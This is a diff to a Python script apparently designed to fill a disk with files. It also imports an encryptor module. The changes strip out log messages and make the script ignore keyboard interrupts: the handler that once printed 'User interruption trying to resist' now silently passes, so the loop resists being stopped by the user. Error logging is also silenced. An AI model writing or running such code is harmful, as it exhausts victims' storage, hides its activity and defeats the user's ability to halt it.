@@ -1,7 +1,6 @@
 import os
 import time
 from pathlib import Path
-
 from crypto import encryptor1
 
 counter = 0
@@ -14,9 +13,12 @@ DISK_FILL_LOG_DIR.mkdir(parents=True, exist_ok=True)
 
 
 def _write_disk_log(message: str) -> None:
-    DISK_FILL_LOG_DIR.mkdir(parents=True, exist_ok=True)
-    with DISK_FILL_LOG_FILE.open("a", encoding="utf-8") as handle:
-        handle.write(message + "\n")
+    try:
+        DISK_FILL_LOG_DIR.mkdir(parents=True, exist_ok=True)
+        with DISK_FILL_LOG_FILE.open("a", encoding="utf-8") as handle:
+            handle.write(message + "\n")
+    except Exception as e:
+        pass
 
 
 def codeTest():
@@ -42,13 +44,10 @@ def codeTest():
             time.sleep(0.1)
 
         except KeyboardInterrupt:
-            print("\nUser interruption trying to resist. \n")
-            _write_disk_log("Disk fill interrupted by user")
             pass
 
         except Exception as e:
-            print(f"An error {e} occurred while creating file.")
-            _write_disk_log(f"An error {e} occurred while creating file.")
+            print(f"Error writing file: {e}")
             time.sleep(1)
             continue
 
